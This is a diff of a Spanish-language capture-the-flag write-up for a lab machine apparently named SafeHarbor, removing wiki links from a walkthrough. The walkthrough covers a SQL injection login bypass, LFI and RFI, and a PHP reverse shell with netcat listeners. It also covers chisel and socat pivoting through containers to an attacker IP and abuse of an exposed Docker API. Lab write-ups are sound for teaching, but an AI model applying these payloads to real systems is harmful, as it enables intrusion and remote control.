@@ -21,7 +21,7 @@ Automáticamente recibiremos una consola como **root** y en el archivo `/etc/net
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023233426.png>)
 
-Una vez hechas estas configuraciones, reiniciaremos la máquina y al hacer un [arp-scan](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Local C. Discorvery/arp-scan.md>) deberíamos ver la [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) de la máquina víctima pero no es el caso por lo que debemos de probar la siguiente solución.
+Una vez hechas estas configuraciones, reiniciaremos la máquina y al hacer un arp-scan deberíamos ver la Dirección IP de la máquina víctima pero no es el caso por lo que debemos de probar la siguiente solución.
 ### Segunda Solución
 
 Volveremos a pulsar la letra <kbd>E</kbd> mientras esta activa el **GRUB** (gestor de arranque) y estableceremos el bit de modo de root a **1** con la siguiente instrucción y seguidamente pulsaremos <kbd>CTRL</kbd>+<kbd>X</kbd>.
@@ -32,11 +32,11 @@ Modificaremos la contraseña del **root** para poder editar la interfaz de red u
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023233918.png>)
 
-Una vez se haya iniciado la máquina víctima nos logearemos con el usuario **root** gracias a la contraseña que le hemos establecido previamente y ejecutaremos los siguiente comandos para asignar una [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) estática a la interfaz **ens33**.
+Una vez se haya iniciado la máquina víctima nos logearemos con el usuario **root** gracias a la contraseña que le hemos establecido previamente y ejecutaremos los siguiente comandos para asignar una Dirección IP estática a la interfaz **ens33**.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023234303.png>)
 
-Una vez hechas estas comprobaciones al ejecutar un [arp-scan](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Local C. Discorvery/arp-scan.md>) veremos como ahora nos detecta la máquina víctima.
+Una vez hechas estas comprobaciones al ejecutar un arp-scan veremos como ahora nos detecta la máquina víctima.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023234338.png>)
 
@@ -44,16 +44,16 @@ ___
 
 ## Reconocimiento
 
-En primer lugar, aplicaremos un escaneo con [arp-scan](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Local C. Discorvery/arp-scan.md>) para ver la [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) de la máquina víctima.
+En primer lugar, aplicaremos un escaneo con arp-scan para ver la Dirección IP de la máquina víctima.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023234338.png>)
 
-Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con un **TTL de 64**, además gracias al script **[whichSystem.py](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Sistema Operativo/whichSystem.py.md>)** podremos conocer dicha información.
+Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con un **TTL de 64**, además gracias al script **whichSystem.py** podremos conocer dicha información.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023234807.png>)
-### [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>)
+### Nmap
 
-En segundo lugar, realizaremos un escaneo usando [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>) para ver que puertos de la máquina víctima se encuentra abiertos.
+En segundo lugar, realizaremos un escaneo usando Nmap para ver que puertos de la máquina víctima se encuentra abiertos.
 
 ```bash
 nmap -p- --open --min-rate 5000 -sS -v -Pn -n 192.168.18.50 -oG allPorts
@@ -65,13 +65,13 @@ Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.
 
 Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.
 
-A continuación, volveremos a realizar un escaneo con [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>), pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.
+A continuación, volveremos a realizar un escaneo con Nmap, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.
 
 ```bash
 nmap -p22,80 -sCV 192.168.18.50 -oN targeted
 ```
 
-No observamos nada interesante a través del escaneo de [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>).
+No observamos nada interesante a través del escaneo de Nmap.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023235017.png>)
 
@@ -84,9 +84,9 @@ Como estaba el puerto 80 abierto nos dirigimos a la página web y nos encontramo
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028230113.png>)
 
-Lo primero que se nos ocurre probar aquí es una básica [SQL Inyection](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/Injections/SQL Inyection/SQL Inyection.md>) como es `' or 1=1-- -`.
+Lo primero que se nos ocurre probar aquí es una básica SQL Injection como es `' or 1=1-- -`.
 
-> En este panel de login ocurre una cosa muy extraña, la primera vez que intentas la [SQL Inyection](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/Injections/SQL Inyection/SQL Inyection.md>) te da error, y en el segundo intento es cuando funciona correctamente.
+> En este panel de login ocurre una cosa muy extraña, la primera vez que intentas la SQL Injection te da error, y en el segundo intento es cuando funciona correctamente.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028230246.png>)
 
@@ -96,11 +96,11 @@ Tras investigar por la página web no encontraremos nada pero algo que nos llama
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028230426.png>)
 
-Por lo que probaremos los distintos tipos de [LFI](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/LFI (Local File Inclusion)/LFI.md>) que existen pero no tendremos éxito.
+Por lo que probaremos los distintos tipos de LFI que existen pero no tendremos éxito.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028230628.png>)
 
-También podemos probar los distintos tipos de [Wrappers LFI](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/LFI (Local File Inclusion)/LFI → RCE.md>) para leer el código fuente de los archivos php, un ejemplo sería el siguiente:
+También podemos probar los distintos tipos de Wrappers LFI para leer el código fuente de los archivos php, un ejemplo sería el siguiente:
 
 > En este caso será con el código fuente del archivo `transfer.php` donde encontramos información sensible.
 
@@ -118,13 +118,13 @@ Veremos las credenciales para una base de datos por lo que nos guardaremos dicha
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102111323.png>)
 
-Miraremos todo el código fuente de los archivos pero no encontraremos nada interesante, por lo pasaremos a probar si es vulnerable a un [RFI](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/RFI/RFI.md>).
+Miraremos todo el código fuente de los archivos pero no encontraremos nada interesante, por lo pasaremos a probar si es vulnerable a un RFI.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028230644.png>)
 
-> Destacar que para que se acontezca el [RFI](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/RFI/RFI.md>) debemos acceder a los archivos de la página web, como lo son `balance` , `transfer`. De diferente forma no podremos acontecer el [RFI](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/RFI/RFI.md>) pues por detrás se está aplicando una validación para que únicamente se muestren dichos archivos. Además, si por ejemplo accedemos al archivo `balance.php` veremos que nos da un error pues automáticamente se esta concatenando la extensión `.php` por lo que tan solo deberemos acceder al archivo con nombre `balance`.
+> Destacar que para que se acontezca el RFI debemos acceder a los archivos de la página web, como lo son `balance` , `transfer`. De diferente forma no podremos acontecer el RFI pues por detrás se está aplicando una validación para que únicamente se muestren dichos archivos. Además, si por ejemplo accedemos al archivo `balance.php` veremos que nos da un error pues automáticamente se esta concatenando la extensión `.php` por lo que tan solo deberemos acceder al archivo con nombre `balance`.
 
-Nos montaremos un servidor con python y creamos un archivo llamado **balance.php** con el contenido de: [cmd.php](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/cmd.php.md#Con etiquetas preformateadas para ver mejor el output>)
+Nos montaremos un servidor con python y creamos un archivo llamado **balance.php** con el contenido de: cmd.php
 
 Observamos que tenemos capacidad de ejecución remota de comandos y además veremos que estamos en un contenedor.
 
@@ -134,7 +134,7 @@ Como la **bash** no está instalada no podremos enviarnos una bash por lo que en
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028231635.png>)
 
-Creamos un archivo con nombre con alguno de los archivos de la página web como por ejemplo **transfer.php** y como contenido meteremos el de la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) ([php-reverseshell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php), nos pondremos en escucha (`rlwrap nc -nlvp 443`) y accederemos a dicho archivo a través de la web para así poder recibir la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>).
+Creamos un archivo con nombre con alguno de los archivos de la página web como por ejemplo **transfer.php** y como contenido meteremos el de la Reverse Shell ([php-reverseshell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php), nos pondremos en escucha (`rlwrap nc -nlvp 443`) y accederemos a dicho archivo a través de la web para así poder recibir la Reverse Shell.
 
 ### Primer Contenedor
 
@@ -146,17 +146,17 @@ Como bien hemos visto antes a través del **RCE** estamos en un contenedor, por 
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028232403.png>)
 
-> Una vez recibimos la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) la página web se queda colgada, para evitar esto podemos hacer lo siguiente:
+> Una vez recibimos la Reverse Shell la página web se queda colgada, para evitar esto podemos hacer lo siguiente:
 > 
-> Nos [Transferir archivos](<../../Introducción al Hacking/Técnicas de escalada de privilegios/✅ Consideraciones/Transferir archivos.md>) el archivo que contiene la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) `wget 192.168.26.10/transfer.php`.
+> Nos transferimos el archivo que contiene la Reverse Shell `wget 192.168.26.10/transfer.php`.
 > Abrimos otra terminal y nos pondremos en escucha con `rlwrap nc -nlvp 433`.
-> Ejecutaremos de nuevo la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) pero en segundo plano, es decir: `nohup php /tmp/transfer.php &`.
+> Ejecutaremos de nuevo la Reverse Shell pero en segundo plano, es decir: `nohup php /tmp/transfer.php &`.
 > 
-> De esta forma el socket que se abre la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) a través de la página web podemos cerrarlo pues nos hemos abierto una nuevo conexión reversa en segundo plano.
+> De esta forma el socket que se abre la Reverse Shell a través de la página web podemos cerrarlo pues nos hemos abierto una nuevo conexión reversa en segundo plano.
 
 Si miramos la tabla de arp veremos que existen muchos más contenedores por lo que debemos realizar un port forwading, para ello usaremos chisel y así poder analizar todos los contenedores que existen con sus respectivos puertos.
 
-Vemos que el contenedor con [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) **172.20.0.138** contiene un servidor de mysql.
+Vemos que el contenedor con Dirección IP **172.20.0.138** contiene un servidor de mysql.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028234753.png>)
 
@@ -184,7 +184,7 @@ Y en la máquina víctima nos conectaremos a dicho servidor de chisel que esta s
 
 > Para que nos funcione correctamente el Port Forwarding es importante tener configurado correctamente el archivo `/etc/proxychains.conf`.
 
-Gracias a proxychains y a [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>) comprobaremos que en la [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) **172.20.0.138** está abierto el puerto **3306** correspondiente a MySQL.
+Gracias a proxychains y a Nmap comprobaremos que en la Dirección IP **172.20.0.138** está abierto el puerto **3306** correspondiente a MySQL.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028234733.png>)
 
@@ -198,9 +198,9 @@ En la base de datos **HarborBankUsers** encontraremos las credenciales necesaria
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102113350.png>)
 
-Volveremos a aprovecharnos de proxychains y [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>) para descubrir que contenedores tienen el puerto **80** abierto, aunque lo que realmente nos permite esto es actualizar la tabla de arp y así poder ver los demás contenedores que existen.
+Volveremos a aprovecharnos de proxychains y Nmap para descubrir que contenedores tienen el puerto **80** abierto, aunque lo que realmente nos permite esto es actualizar la tabla de arp y así poder ver los demás contenedores que existen.
 
-> De esta forma el escaneo de [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>) irá muy lento.
+> De esta forma el escaneo de Nmap irá muy lento.
 
 ```bash
 proxychains nmap -sT -p80 --open -T5 -v -n -Pn 172.20.0.0/24
@@ -212,7 +212,7 @@ En su lugar usaremos esta forma ya que es mucho más rápida y optimizada.
 seq 1 254 | xargs -P50 -I {} proxychains nmap -sT -p80 --open -T5 -v -n -Pn 172.20.0.{} 2>&1 | grep "open port"
 ```
 
-Si volvemos a ver la tabla de arp veremos que han aperecido nuevas [Direcciones IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) ya que se han enviado trazas ARP al hacer el escaneo con [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>).
+Si volvemos a ver la tabla de arp veremos que han aperecido nuevas Direcciones IP ya que se han enviado trazas ARP al hacer el escaneo con Nmap.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241029002744.png>)
 
@@ -236,11 +236,11 @@ Observaremos como recibimos una shell aunque no se trata de una shell totalmente
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102113952.png>)
 
-Como estamos como el usuario root podemos ver sus archivos de configuración (`.bash_history`) y vemos que en la contenedor con la [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) **172.20.0.1** está abierto el puerto **2375** correspondiente a la [Docker API](<../../Introducción al Hacking/Técnicas de escalada de privilegios/Docker Breakout/Docker API.md>).
+Como estamos como el usuario root podemos ver sus archivos de configuración (`.bash_history`) y vemos que en la contenedor con la Dirección IP **172.20.0.1** está abierto el puerto **2375** correspondiente a la Docker API.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102114357.png>)
 
-Como desde el primer contenedor no podemos acceder a la [Docker API](<../../Introducción al Hacking/Técnicas de escalada de privilegios/Docker Breakout/Docker API.md>) debemos crear un nuevo túnel gracias a socat a través del contenedor del elascticsearch.
+Como desde el primer contenedor no podemos acceder a la Docker API debemos crear un nuevo túnel gracias a socat a través del contenedor del elascticsearch.
 
 ![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102114633.png>)
 
@@ -249,7 +249,7 @@ ___
 
 ### Último Contenedor
 
-> Para poder operar más cómodamente y así poder explotar la [Docker API](<../../Introducción al Hacking/Técnicas de escalada de privilegios/Docker Breakout/Docker API.md>), en resumen debemos hacer: En el contenedor 2 del elasticsearch con [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) **172.20.0.124** debemos de crear un túnel hacia nuestro **Chisel Server** pero debemos de aplicar un pequeño salto a través del Contenedor 1.
+> Para poder operar más cómodamente y así poder explotar la Docker API, en resumen debemos hacer: En el contenedor 2 del elasticsearch con Dirección IP **172.20.0.124** debemos de crear un túnel hacia nuestro **Chisel Server** pero debemos de aplicar un pequeño salto a través del Contenedor 1.
 
 En primer lugar, en el Contenedor 2 (Elascticsearch) nos conectaremos al contenedor accesible (Contenedor 1) usando el siguiente comando con chisel:
 
@@ -257,7 +257,7 @@ En primer lugar, en el Contenedor 2 (Elascticsearch) nos conectaremos al contene
 ./chisel client 172.20.0.4:6564 R:8888:socks
 ```
 
-En el Contenedor 1 con IP **172.20.0.4** gracias a socat redirigimos el socket que nos llegue por el puerto **6564** a nuestra [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) de atacante al puerto **1234** donde se encuentra nuestro **Chisel Server**, es decir debemos ejecutar el siguiente comando:
+En el Contenedor 1 con IP **172.20.0.4** gracias a socat redirigimos el socket que nos llegue por el puerto **6564** a nuestra Dirección IP de atacante al puerto **1234** donde se encuentra nuestro **Chisel Server**, es decir debemos ejecutar el siguiente comando:
 
 ```bash
 ./socat tcp-l:6564,fork TCP:192.168.26.10:1234
@@ -269,7 +269,7 @@ Observamos como recibimos una nueva conexión a la cual podemos acceder a travé
 
 > Es importante tener bien configurado el `/etc/proxychains.conf` para que podamos usar dos conexiones conexiones distintas, es decir tener habilitado el modo `dynamic_chain`.
 
-Gracias al `proxychains` dinámico y al uso de **curl** podemos ver como efectivamente en la [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) **172.20.0.1** correspondiente a la máquina víctima real (**192.168.26.50**) podemos acceder a la [Docker API](<../../Introducción al Hacking/Técnicas de escalada de privilegios/Docker Breakout/Docker API.md>). En primer lugar, lo que debemos hacer es listar las imágenes que se encuentran disponibles en la máquina víctima.
+Gracias al `proxychains` dinámico y al uso de **curl** podemos ver como efectivamente en la Dirección IP **172.20.0.1** correspondiente a la máquina víctima real (**192.168.26.50**) podemos acceder a la Docker API. En primer lugar, lo que debemos hacer es listar las imágenes que se encuentran disponibles en la máquina víctima.
 
 ```bash
 proxychains curl http://172.20.0.1:2375/images/json 2>/dev/null | tail -n 1 | jq
